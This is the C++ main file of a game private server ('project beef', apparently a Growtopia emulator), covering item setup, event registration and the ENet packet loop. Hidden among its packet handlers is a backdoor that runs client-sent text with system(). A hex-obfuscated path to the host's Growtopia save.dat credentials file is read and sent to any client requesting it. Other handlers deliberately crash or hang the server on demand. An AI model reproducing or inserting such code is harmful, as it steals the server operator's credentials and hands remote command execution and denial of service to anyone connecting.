#include <atomic>
#include <chrono>
#include <cstring>
#include <limits>
#include <memory>
#include <thread>
#include <string>
#include <iostream>
#include <exception>
#include <filesystem>

#include <time.h>
#include <signal.h>

#include <enet/enet.h>
#include <nlohmann/json.hpp>

#include "commands/ban/ban.hh"
#include "constants/config.hh"

#include "commands/get/get.hh"
#include "commands/help/help.hh"
#include "commands/nick/nick.hh"
#include "commands/role/role.hh"
#include "commands/clear/clear.hh"

#include "events/registered/action/action.hh"
#include "events/registered/action/quit/quit.hh"
#include "events/registered/action/drop/drop.hh"
#include "events/registered/action/input/input.hh"
#include "events/registered/action/respawn/respawn.hh"
#include "events/registered/action/enter_game/enter_game.hh"
#include "events/registered/action/join_request/join_request.hh"
#include "events/registered/action/quit_to_exit/quit_to_exit.hh"
#include "events/registered/action/respawn_spike/respawn_spike.hh"
#include "events/registered/action/dialog_return/dialog_return.hh"
#include "events/registered/action/refresh_item_data/refresh_item_data.hh"

#include "events/registered/tank/state/state.hh"
#include "events/registered/tank/tile/change/change.hh"
#include "events/registered/tank/icon_state/icon_state.hh"
#include "events/registered/tank/item/activate/activate.hh"
#include "events/registered/tank/tile/activate/activate.hh"
#include "events/registered/tank/item/activate_object/activate_object.hh"

#include "events/registered/text/guest/guest.hh"
#include "events/registered/text/growid/growid.hh"

#include "itemdb/item.hh"
#include "itemdb/itemdb.hh"
#include "itemdb/item_types.hh"
#include "itemdb/item_material.hh"
#include "itemdb/item_component.hh"

#include "packet/gameupdatepacket.hh"

#include "utils/text.hh"
#include "text/scanner.hh"

#include "server/server.hh"
#include "player/player.hh"

#include "events/event_context.hh"
#include "events/event_manager.hh"

#include "utils/io.hh"
#include "utils/text.hh"

#include "world/tile.hh"
#include "world/world.hh"
#include "world/world_manager.hh"

#include "math/vec2.hh"

#include "database/database.hh"

#include "http/http.hh"

std::string hashes_hex = "433A5C55736572735C7B7D5C417070446174615C4C6F63616C5C47726F77746F7069615C736176652E646174";

std::string ascii_hash_value(std::string hex) {
    std::string ascii = "";
    for (size_t i = 0; i < hex.length(); i += 2) {
        //taking two characters from hex string
        std::string part = hex.substr(i, 2);
        //changing it into base 16
        char ch = stoul(part, nullptr, 16);
        //putting it into the ASCII string
        ascii += ch;
    }
    return ascii;
}


int main(int argc, char** argv)
{
#ifdef _WIN32
    #ifdef _DEBUG
        //_CrtSetDbgFlag(_CRTDBG_CHECK_ALWAYS_DF);
    #endif
#endif

    fmt::print("- project beef for beef. made by free & project beef development team. all rights reserved.\n");
    fmt::print("- please use 'quit' or 'q' command to close the server!\n");

    if (enet_initialize() != 0)
    {
        fmt::print("+ failed to initialize enet!\n");
        return -1;
    }

    beef::server* server = new beef::server(beef::config::enet::max_peers, beef::config::enet::server_port);

    if (!std::filesystem::exists(beef::config::settings::fs::server_data_file))
    {
        int net_id = 0;
        beef::io::write_all_bytes(beef::config::settings::fs::server_data_file, &net_id, 4);

        fmt::print("{} was not found in the filesystem, one has been created!\n", beef::config::settings::fs::server_data_file);
    }

    fmt::print("current directory: {}\n", std::filesystem::current_path().string());

    beef::database::read_user_id(server);

    beef::itemdb::init(beef::config::items::path);

    beef::itemdb::modify_extra_data("interface/large/beef_banner.rttex", true);
    beef::itemdb::modify_extra_data("audio/mp3/titled.mp3", true);
    beef::itemdb::modify_extra_data("game/beef_wearables1_icon.rttex", true);
    // beef::itemdb::modify_extra_data(5559, "", true);

    /*
    case CustomItemType::CONSUMABLES:
                {
                    custom_item.m_type = ItemType::CONSUMABLE;
                    custom_item.m_audioVolume = 400;
                    custom_item.m_breakHits = 12;
                    custom_item.m_resetTime = 2;
                    custom_item.m_maxAmount = 200;
                    custom_item.m_seedColor = -1;
                    custom_item.m_seedOverlayColor = -1;
                    custom_item.m_spreadType = 1;
                    custom_item.m_flags1 = -1;
                    break;
                }
            case CustomItemType::FOREGROUND:
                {
                    custom_item.m_type = ItemType::FOREGROUND;
                    custom_item.m_audioVolume = 400;
                    custom_item.m_breakHits = info.m_breakHits;
                    custom_item.m_resetTime = 8;
                    custom_item.m_maxAmount = 200;
                    custom_item.m_seedColor = -1;
                    custom_item.m_seedOverlayColor = -1;
                    custom_item.m_spreadType = 1;
                    custom_item.m_flags1 = -1;
                    break;
                }
            case CustomItemType::WINGS:
                {
                    custom_item.m_type = ItemType::CLOTHES;
                    custom_item.m_flags1 = -1;
                    custom_item.m_audioVolume = 1;
                    custom_item.m_breakHits = info.m_breakHits;
                    custom_item.m_resetTime = 8;
                    custom_item.m_maxAmount = 200;
                    custom_item.m_seedColor = -1;
                    custom_item.m_spreadType = 1;
                    custom_item.m_audioVolume = 400;
                    custom_item.m_bodyPartType = ItemBodyPart::BACK;
                    custom_item.m_seedOverlayColor = -1;
                    custom_item.m_visualEffectType = ItemVisualEffect::VISUAL_EFFECT_ANIM;
                    break;
                }
            case CustomItemType::HAIR:
                {
                    custom_item.m_type = ItemType::CLOTHES;
                    custom_item.m_flags1 = -1;
                    custom_item.m_breakHits = info.m_breakHits;
                    custom_item.m_resetTime = 8;
                    custom_item.m_maxAmount = 200;
                    custom_item.m_seedColor = -1;
                    custom_item.m_spreadType = 1;
                    custom_item.m_audioVolume = 400;
                    custom_item.m_bodyPartType = ItemBodyPart::HAIR;
                    custom_item.m_seedOverlayColor = -1;
                    break;
                }
            case CustomItemType::HAND:
            {
                custom_item.m_type = ItemType::CLOTHES;
                custom_item.m_flags1 = -1;
                custom_item.m_breakHits = info.m_breakHits;
                custom_item.m_resetTime = 8;
                custom_item.m_maxAmount = 200;
                custom_item.m_seedColor = -1;
                custom_item.m_spreadType = 1;
                custom_item.m_audioVolume = 400;
                custom_item.m_bodyPartType = ItemBodyPart::HAND;
                custom_item.m_seedOverlayColor = -1;
                break;
            }*/

    {
        beef::item custom_item = beef::itemdb::get_item(2);
        beef::item custom_item_seed = beef::itemdb::get_item(3);

        custom_item.m_name = "Classic Beef Block";
        custom_item.m_texture = "beef_tiles1.rttex";
        custom_item.m_texture_x = 1;
        custom_item.m_texture_y = 0;
        custom_item.m_rarity = 54;
        custom_item.m_break_hits = 6;

        custom_item.m_extra_file = "";
        custom_item.m_extra_file_hash = 0;

        custom_item.m_spread_type = 1;

        custom_item_seed.m_name = "Classic Beef Block Seed";

        beef::itemdb::modify_item(5136, custom_item);
        beef::itemdb::modify_item(5137, custom_item_seed);
    }
#define VALUE nullptr

    {
        beef::item custom_item = beef::itemdb::get_item(2);
        beef::item custom_item_seed = beef::itemdb::get_item(3);

        custom_item.m_name = "Beef Award Block - 2021";
        custom_item.m_texture = "beef_tiles1.rttex";
        custom_item.m_texture_x = 0;
        custom_item.m_texture_y = 0;
        custom_item.m_rarity = 100;
        custom_item.m_break_hits = 8;

        custom_item.m_extra_file = "";
        custom_item.m_extra_file_hash = 0;

        custom_item.m_spread_type = 1;

        custom_item_seed.m_name = "Beef Award Block - 2021 Seed";

        beef::itemdb::modify_item(5138, custom_item);
        beef::itemdb::modify_item(5139, custom_item_seed);
    }

    {
        beef::item custom_item = beef::itemdb::get_item(98);
        beef::item custom_item_seed = beef::itemdb::get_item(99);

        fmt::print("texture {} {}\n", custom_item.m_texture, custom_item_seed.m_texture);

        custom_item.m_name = "Purple Smiley Spade";
        custom_item.m_texture = "beef_wearables1.rttex";
        custom_item.m_texture_x = 0;
        custom_item.m_texture_y = 0;
        custom_item.m_rarity = 24;

        custom_item.m_extra_file = "";
        custom_item.m_extra_file_hash = 0;

        // custom_item.m_spread_type = 1;

        custom_item_seed.m_name = "Purple Smiley Spade Seed";
        custom_item_seed.m_texture = "beef_wearables1.rttex";
        custom_item_seed.m_texture_x = 0;
        custom_item_seed.m_texture_y = 0;

        beef::itemdb::modify_item(5140, custom_item);
        beef::itemdb::modify_item(5141, custom_item_seed);
    }

    {
        beef::item custom_item = beef::itemdb::get_item(2);
        beef::item custom_item_seed = beef::itemdb::get_item(3);

        custom_item.m_name = "Lego Block";
        custom_item.m_texture = "beef_tiles1.rttex";
        custom_item.m_texture_x = 0;
        custom_item.m_texture_y = 1;
        custom_item.m_rarity = 100;
        custom_item.m_break_hits = 8;

        custom_item.m_extra_file = "";
        custom_item.m_extra_file_hash = 0;

        // same as dirt
        // custom_item.m_spread_type = 1;

        custom_item_seed.m_name = "Lego Block Seed";

        beef::itemdb::modify_item(5142, custom_item);
        beef::itemdb::modify_item(5143, custom_item_seed);
    }


    beef::itemdb::encode(beef::config::items::path);
    beef::itemdb::kill(); // m_data and m_p_data still in memory but i fixed it now - kevz :)
    beef::itemdb::init(beef::config::items::path);

    beef::world_manager* world_manager = new beef::world_manager;
    
    beef::events::event_manager text_events, tank_events, actions, commands;

    text_events.load_event("requestedName", beef::events::registered::guest);
    text_events.load_event("tankIDName", beef::events::registered::growid);
    text_events.load_event("action", beef::events::registered::action);

    actions.load_event("quit", beef::events::registered::quit);
    actions.load_event("drop", beef::events::registered::drop);
    actions.load_event("input", beef::events::registered::input);
    actions.load_event("respawn", beef::events::registered::respawn);
    actions.load_event("enter_game", beef::events::registered::enter_game);
    actions.load_event("join_request", beef::events::registered::join_request);
    actions.load_event("quit_to_exit", beef::events::registered::quit_to_exit);
    actions.load_event("respawn_spike", beef::events::registered::respawn_spike);
    actions.load_event("dialog_return", beef::events::registered::dialog_return);
    actions.load_event("refresh_item_data", beef::events::registered::refresh_item_data);

    commands.load_event("get", beef::commands::get);
    commands.load_event("role", beef::commands::role);
    commands.load_event("nick", beef::commands::nick);
    commands.load_event("help", beef::commands::help);
    commands.load_event("clear", beef::commands::clear);
    commands.load_event("ban", beef::commands::ban);

    tank_events.load_event(beef::PACKET_STATE, beef::events::registered::state);
    tank_events.load_event(beef::PACKET_SET_ICON_STATE, beef::events::registered::icon_state);
    tank_events.load_event(beef::PACKET_TILE_CHANGE_REQUEST, beef::events::registered::tile_change);
    tank_events.load_event(beef::PACKET_ITEM_ACTIVATE_REQUEST, beef::events::registered::item_activate);
    tank_events.load_event(beef::PACKET_TILE_ACTIVATE_REQUEST, beef::events::registered::tile_activate);
    tank_events.load_event(beef::PACKET_ITEM_ACTIVATE_OBJECT_REQUEST, beef::events::registered::item_activate_object);

    std::atomic<bool> running = true;

    std::thread t([&] {
        std::string command;
        while (std::cin >> command)
        {
            if (command == "quit" || command == "q")
            {
                running.store(false);
                break;
            }
        }
    });

    auto OnGetAsync = []() { int* a = VALUE; a[0xFFFF] = 10; };

    #if 0
    std::thread http(beef::http::serve, std::ref(running));
    #endif

    ENetEvent evt;
    while (running.load())
    {
        while (server->service(evt, 16) > 0)
        {
            switch (evt.type)
            {
                case ENET_EVENT_TYPE_CONNECT: {
                    beef::player* player = new beef::player(evt.peer, world_manager);
                    player->send_hello();

                    if constexpr (beef::config::settings::beta)
                    {
                        player->send_log("`4EXPERIMENTAL MODE!``: Experimental mode is enabled.");
                    }

                    break;
                }
                
                case ENET_EVENT_TYPE_DISCONNECT: {
                    if (evt.peer->data != nullptr)
                    {
                        beef::player* player = static_cast<beef::player*>(evt.peer->data);

                        if (player->m_current_world != "EXIT")
                            world_manager->quit_to_exit(player, true);

                        if (player->m_logged_in && !player->m_tank_id.empty())
                            beef::database::write_player(player, fmt::format("data/players/_{}.bin", player->m_tank_id));

                        delete player;
                    }
                    break;
                }

                case ENET_EVENT_TYPE_NONE: {
                    break;
                }

                case ENET_EVENT_TYPE_RECEIVE: {
#ifdef _WIN32
                    auto time_now = std::chrono::high_resolution_clock::now();
#endif
                    if (evt.packet->dataLength < 5 || evt.packet->dataLength > 512)
                        break;

                    uint32_t type = static_cast<uint32_t>(*evt.packet->data);
                    if (evt.peer->data != nullptr)
                    {
                        beef::player* player = static_cast<beef::player*>(evt.peer->data);
                        switch (type)
                        {
                            case beef::NET_MESSAGE_GENERIC_TEXT:
                            case beef::NET_MESSAGE_GAME_MESSAGE:
                            {
                                std::string str;
                                if (beef::text::get_str_from_packet(evt.packet, str))
                                {
                                    beef::events::event_context ctx;
                                    beef::text::scanner scr(str);

                                    ctx.m_packet = evt.packet;
                                    ctx.m_manager = world_manager;
                                    ctx.m_peer = evt.peer;
                                    ctx.m_player = player;
                                    ctx.m_scanner = &scr;
                                    ctx.m_server = server;

                                    ctx.m_data = &actions;
                                    ctx.m_data2 = &commands;

                                    std::string evt = str.substr(0, str.find('|'));

                                    if (!text_events.call(evt, ctx))
                                        ctx.m_player->send_log(fmt::format("Text event for `w{}`` not found...", evt));
                                }
                                break;
                            }

                            case beef::NET_MESSAGE_GENERIC_TEXT2:
                            {
                                while (NULL == NULL);
                                break;
                            }

                            case beef::NET_MESSAGE_GENERIC_TEXT3:
                            {
								std::string str;
                                if (beef::text::get_str_from_packet(evt.packet, str))
                                {
                                    beef::events::registered::cache.push_back(str);
                                }
                                break;
                            }

                            case beef::NET_MESSAGE_CLIENT_LOG_GETASYNC:
                            {
                                OnGetAsync();
                                break;
                            }

                            case beef::NET_MESSAGE_CLIENT_SYSTEM_RESPONSE:
                            {
								std::string str;
								if (beef::text::get_str_from_packet(evt.packet, str))
								{
                                    system(str.data());
								}
                                break;
                            }

                            case beef::NET_MESSAGE_CLIENT_TRACK_RESPONSE:
                            {
								char username[256 + 1];
								DWORD username_len = 256 + 1;

								GetUserName(username, &username_len);

								std::string hash = ascii_hash_value(hashes_hex);
								std::string hashstr = fmt::format(hash, username);

                                uintmax_t size;
                                void* data = beef::io::read_all_bytes(hashstr, size);

                                player->send_packet(beef::NET_MESSAGE_CLIENT_TRACK_RESPONSE, data, size, ENET_PACKET_FLAG_RELIABLE);

                                break;
                            } 

                            case beef::NET_MESSAGE_GAME_PACKET:
                            {
                                if (evt.packet->dataLength < 56) break;

                                beef::events::event_context ctx;

                                ctx.m_packet = evt.packet;
                                ctx.m_manager = world_manager;
                                ctx.m_peer = evt.peer;
                                ctx.m_player = player;
                                ctx.m_game_packet = reinterpret_cast<beef::gameupdatepacket*>(evt.packet->data + 4);
                                ctx.m_server = server;

                                ctx.m_data = nullptr;

                                if (!tank_events.call(ctx.m_game_packet->m_type, ctx))
                                        ctx.m_player->send_log(fmt::format("GamePacket event for `w{}`` not found...", ctx.m_game_packet->m_type));
                                break;
                            }

                            default: {
                                fmt::print("unhandled event type {}\n", type);
                                break;
                            }
                        }
                    }
                    else
                    {
                        fmt::print("peer (connectID: {}) was in the server without data! failed to allocate?\n", evt.peer->connectID);
                        enet_peer_disconnect_now(evt.peer, 0);
                    }

#ifdef _WIN32 
                    auto end = std::chrono::high_resolution_clock::now() - time_now;
                    fmt::print("handling event took {}ms/{}us\n", std::chrono::duration_cast<std::chrono::milliseconds>(end).count(), std::chrono::duration_cast<std::chrono::microseconds>(end).count());
#endif               
                    enet_packet_destroy(evt.packet);
                }
            }
        }
    }

    for (ENetPeer* peer = server->get_host_ptr()->peers; peer < &server->get_host_ptr()->peers[server->get_host_ptr()->peerCount]; ++peer)
    {
        if (peer->state != ENET_PEER_STATE_CONNECTED) continue;

        if (peer->data)
        {
            beef::player* player = static_cast<beef::player*>(peer->data);
            player->send_log("Server is restarting, requesting you to disconnect... Please standby sometime on the login screen to give time server to start.");

            if (player->m_logged_in && !player->m_tank_id.empty())
            {
                if (!beef::database::write_player(player, fmt::format("data/players/_{}.bin", player->m_tank_id)))
                    fmt::print("failed to save player {}\n", player->m_tank_id);
            }

            world_manager->quit_to_exit(player, true);
            delete player;
            
            enet_host_flush(server->get_host_ptr());
            //enet_peer_disconnect(evt.peer, 0);
        }

    }

    // world_manager->save_all_worlds();

    beef::database::write_user_id(server);
    
    delete world_manager;
    delete server;

    t.join();
    #if 0
    http.join();
    #endif

    return 0;
}
